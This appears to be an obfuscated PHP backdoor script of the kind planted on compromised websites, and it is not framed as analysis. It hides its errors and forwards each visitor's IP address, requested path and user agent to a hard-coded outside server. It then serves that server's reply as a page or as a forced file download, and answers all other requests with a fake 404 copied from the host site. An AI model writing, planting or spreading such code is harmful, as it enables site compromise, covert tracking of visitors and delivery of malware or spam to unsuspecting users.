<?php
$hfmnibgtig = "ips";
$zaqukohkkj = "ip";
$fpczfknke = "func";
$gkwyvse = "h";
$goqptofiw = "res";
$thpskcj = "h_detected";
$bjkmsyafdmuw = "headers";
$rhxiztjm = "data";
$duzghq = "k";
$dmkoegsts = "v";
$kmmjtmc = "cookie";
$cirsgdg = "request";
$fkeupeyexfmk = "timeout";
$yaudjyo = "errstr";
$hahqpuuldvr = "errno";
$nwmhctnoy = "port";
$evrshigd = "fp";
$dkybtjey = "params";
$hygnxl = "uri";
$zovytdpysm = "type";
$unvrvgmd = "filename";
$vlqopxmxgrd = "content";
$adalfphu = "url";
$exutbtuec = "query";
$frtdlntnn = "remote";
error_reporting(0);
ini_set("display_errors", 0);
if (strlen($_SERVER["QUERY_STRING"]) == 0) {
    error_404();
}
$remote = "http://78.138.127.174/2701dfbvcxff.php";
php_display($remote);
error_404();
function php_display($url) {
    $raarljmr = "query";
    $kghdwca = "url";
    $vilfjgrstr = "query";
    $query = array();
    $sxxpvocik = "content";
    $zqhblgefkyfd = "content";
    $query
    ["ip"] = getIp();
    $mmzcqudkxbjd = "content";
    $query
    ["path"] = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $utmelghg = "content";
    $wtyfqiuuryn = "query";
    $query
    ["useragent"] = getUseragent();
    $url = $url . "?" . http_build_query($ {
        $wtyfqiuuryn
    });
    $kjkunvv = "filename";
    $ {
        $mmzcqudkxbjd
    } = @file_get_contents($url);
    if (strlen($content) < 10) {
        error_404();
    }
    $content = explode("
", $content);
    $ {
        $kjkunvv
    } = array_shift($content);
    $content = implode("
", $ {
        $sxxpvocik
    });
    if (strstr($filename, ".html") === FALSE) {
        $mkuwusknikkm = "content";
        $cdwvgbn = "filename";
        $type = "application/octet-stream";
        $uctveteetipe = "type";
        header("Content-Type:" . $type);
        header("Content-Disposition: attachment; filename=" . $ {
            $cdwvgbn
        });
        header("Content-Length: " . strlen($content));
    }
    echo $content;
    exit();
}
function error_404() {
    $ekigsyougde = "content";
    header("HTTP/1.1 404 Not Found");
    $ppooicwhygh = "content";
    $mlpyciogd = "content";
    $uri = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
    $dmpqcvqrmbxi = "uri";
    $content = custom_http_request("http://" . $_SERVER["HTTP_HOST"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
    $content = str_replace("/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", $uri, $content);
    exit($ {
        $mlpyciogd
    });
}
function custom_http_request($params) {
    $rpbduqeew = "params";
    $kfmdcq = "params";
    $vixdrutdmipl = "scheme";
    $skithlp = "params";
    $xxehovhjncm = "params";
    $imarwteum = "url";
    $mgfhxdulu = "timeout";
    $hiznhk = "port";
    $pgcnydrskkow = "res";
    $lbleptt = "params";
    $deynxvrikuf = "url";
    $gltisxmf = "url";
    if (!is_array($params)) {
        $ifhixrdyp = "params";
        $ {
            $ifhixrdyp
        } = array("url" => $params, "method" => "GET");
    }
    $yepdcevuxpl = "url";
    $vihctkjfhvvy = "params";
    if ($params
    ["url"] == "") return FALSE;
    $ubxlgnhuyr = "params";
    if (!isset($params
    ["method"])) $ {
        $ubxlgnhuyr
    }
    ["method"] = (isset($params
    ["data"]) && is_array($params
    ["data"])) ? "POST" : "GET";
    $cskpgqwdqo = "params";
    $params
    ["method"] = strtoupper($params
    ["method"]);
    if (!in_array($params
    ["method"], array("GET", "POST"))) return FALSE;
    $epiobcqrqlz = "url";
    $ {
        $gltisxmf
    } = parse_url($ {
        $cskpgqwdqo
    }
    ["url"]);
    $nxufvtacx = "res";
    $sfluwzoaoune = "params";
    if (!isset($url
    ["scheme"])) $url
    ["scheme"] = "http";
    if (!isset($url
    ["path"])) $url
    ["path"] = "/";
    $niyefoisfi = "url";
    $tkjjnyhwfoag = "scheme";
    if (!isset($url
    ["host"]) && isset($ {
        $epiobcqrqlz
    }
    ["path"])) {
        $pgldxeumkut = "url";
        if (strpos($url
        ["path"], "/")) {
            $nrkejedmbdu = "url";
            $rwmlcdvjgd = "url";
            $mawbbupy = "url";
            $wxvxqaycqqcv = "url";
            $url
            ["host"] = substr($url
            ["path"], 0, strpos($url
            ["path"], "/"));
            $url
            ["path"] = substr($url
            ["path"], strpos($ {
                $nrkejedmbdu
            }
            ["path"], "/"));
        } else {
            $grhytlhc = "url";
            $qhdogvo = "url";
            $ {
                $qhdogvo
            }
            ["host"] = $url
            ["path"];
            $url
            ["path"] = "/";
        }
    }
    $url
    ["path"] = preg_replace("/[\/]+/", "/", $url
    ["path"]);
    if (isset($url
    ["query"])) $url
    ["path"].= "?{$url['query']}";
    $ {
        $hiznhk
    } = isset($params
    ["port"]) ? $ {
        $lbleptt
    }
    ["port"] : (isset($url
    ["port"]) ? $url
    ["port"] : ($url
    ["scheme"] == "https" ? 443 : 80));
    $ {
        $mgfhxdulu
    } = isset($params
    ["timeout"]) ? $params
    ["timeout"] : 30;
    if (!isset($params
    ["return"])) $params
    ["return"] = "content";
    $jskpbxwrosfw = "res";
    $moewmhtgse = "headers";
    $bupjnclc = "fp";
    $scheme = $url
    ["scheme"] == "https" ? "ssl://" : "";
    $fp = @fsockopen($ {
        $tkjjnyhwfoag
    } . $url
    ["host"], $port, $errno, $errstr, $timeout);
    if ($ {
        $bupjnclc
    }) {
        $ywkmwgmun = "fp";
        $wrywtprn = "request";
        $ctwpwmfpd = "request";
        $rcewvwoncgs = "request";
        $klaxtlfng = "params";
        $ejtawqkjvwv = "params";
        if (!isset($ {
            $klaxtlfng
        }
        ["User-Agent"])) $ {
            $ejtawqkjvwv
        }
        ["User-Agent"] = "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
        $njmbwqgsjh = "params";
        $qycqxlfe = "res";
        $request = "{$params['method']} {$url['path']} HTTP/1.0
";
        $ {
            $wrywtprn
        }.= "Host: {$url['host']}
";
        $bqwdrkh = "params";
        $request.= "User-Agent: {$params['User-Agent']}" . "
";
        if (isset($params
        ["referer"])) $request.= "Referer: {$params['referer']}
";
        $sfgjshen = "params";
        if (isset($params
        ["cookie"])) {
            $xbuxsue = "cookie";
            $izixaouwju = "params";
            $cookie = "";
            $uydzdxtjj = "cookie";
            $qfbaog = "request";
            if (is_array($ {
                $izixaouwju
            }
            ["cookie"])) {
                $etxefpr = "cookie";
                $qvsaebfw = "cookie";
                $whhxdeqplxdm = "k";
                $qsnkils = "params";
                $oqcnxxdgy = "v";
                foreach ($ {
                    $qsnkils
                }
                ["cookie"] as $k => $ {
                    $oqcnxxdgy
                }) $ {
                    $qvsaebfw
                }.= "$k=$v; ";
                $tymuackpyyx = "cookie";
                $ {
                    $tymuackpyyx
                } = substr($ {
                    $etxefpr
                }, 0, -2);
            } else $ {
                $uydzdxtjj
            } = $params
            ["cookie"];
            if ($cookie != "") $ {
                $qfbaog
            }.= "Cookie: $cookie
";
        }
        $request.= "Connection: close
";
        if ($params
        ["method"] == "POST") {
            $vwhhfisif = "data";
            if (isset($params
            ["data"]) && is_array($params
            ["data"])) {
                $mgmnrst = "v";
                $rwdexltep = "data";
                $jmhoexxptj = "data";
                $cbkyxubxa = "data";
                $lbctcbl = "data";
                $hplxqfn = "k";
                foreach ($params
                ["data"] AS $k => $v) $ {
                    $cbkyxubxa
                }.= urlencode($k) . "=" . urlencode($v) . "&";
                if (substr($data, -1) == "&") $ {
                    $rwdexltep
                } = substr($data, 0, -1);
            }
            $data.= "

";
            $request.= "Content-type: application/x-www-form-urlencoded
";
            $request.= "Content-length: " . strlen($data) . "
";
        }
        $request.= "
";
        $gymemwndow = "fp";
        if ($params
        ["method"] == "POST") $request.= $data;
        @fwrite($fp, $ {
            $rcewvwoncgs
        });
        $res = "";
        $headers = "";
        $h_detected = false;
        while (!@feof($fp)) {
            $lqnmxlpiaw = "res";
            $pumdxni = "res";
            $ {
                $pumdxni
            }.= @fread($fp, 1024);
            if (!$h_detected && strpos($ {
                $lqnmxlpiaw
            }, "

") !== FALSE) {
                $phtitpwfi = "res";
                $ceotabbpqud = "headers";
                $pjnwou = "res";
                $zhraky = "params";
                $oeqiubfj = "res";
                $adaqdivq = "headers";
                $h_detected = true;
                $khgqovuhu = "params";
                $headers = substr($res, 0, strpos($res, "

"));
                $ {
                    $oeqiubfj
                } = substr($res, strpos($res, "

") + 4);
                $ugvdzmbig = "params";
                if ($ {
                    $khgqovuhu
                }
                ["return"] == "headers" || $params
                ["return"] == "array" || (isset($ {
                    $ugvdzmbig
                }
                ["redirect"]) && $params
                ["redirect"] == true)) {
                    $tsbiwulfowhr = "v";
                    $iqrhxdf = "h";
                    $tuykrk = "headers";
                    $frfdskiwxv = "k";
                    $kpwuep = "headers";
                    $h = explode("
", $ {
                        $tuykrk
                    });
                    $headers = array();
                    foreach ($h as $ {
                        $frfdskiwxv
                    } => $ {
                        $tsbiwulfowhr
                    }) {
                        $dicebo = "v";
                        if (strpos($ {
                            $dicebo
                        }, ":")) {
                            $ojxubpulg = "v";
                            $mkfupgkidqyu = "v";
                            $k = substr($v, 0, strpos($ {
                                $ojxubpulg
                            }, ":"));
                            $v = trim(substr($v, strpos($v, ":") + 1));
                        }
                        $kiaarey = "v";
                        $headers
                        [strtoupper($k) ] = $v;
                    }
                }
                if (isset($params
                ["redirect"]) && $params
                ["redirect"] == true && isset($headers
                ["LOCATION"])) {
                    $ssmmvued = "params";
                    $params
                    ["url"] = $headers
                    ["LOCATION"];
                    if (!isset($params
                    ["redirect-count"])) $params
                    ["redirect-count"] = 0;
                    if ($params
                    ["redirect-count"] < 10) {
                        $params
                        ["redirect-count"]++;
                        $jetmhydib = "func";
                        $bfdsupd = "params";
                        $rzdgnapdmw = "params";
                        $ {
                            $jetmhydib
                        } = __FUNCTION__;
                        return @is_object($this) ? $this->$func
                        ($ {
                            $bfdsupd
                        }) : $func
                        ($ {
                            $rzdgnapdmw
                        });
                    }
                }
                if ($params
                ["return"] == "headers") return $headers;
            }
        }
        @fclose($fp);
    } else return FALSE;
    if ($params
    ["return"] == "array") $ {
        $pgcnydrskkow
    } = array("headers" => $ {
        $moewmhtgse
    }, "content" => $res);
    return $res;
}
function getUseragent() {
    return $_SERVER["HTTP_USER_AGENT"];
}
function getIp() {
    $nzpdlvvn = "ip";
    $jfrgotjwgfeb = "ip";
    $ip = NULL;
    if (isset($_SERVER["REMOTE_ADDR"])) {
        $ip = $_SERVER["REMOTE_ADDR"];
    }
    if (strpos($ {
        $nzpdlvvn
    }, ",") !== FALSE) {
        $fpparhroiyb = "ip";
        $ips = explode(",", $ip);
        $ip = trim(array_pop($ips));
    }
    return $ip;
} ?>
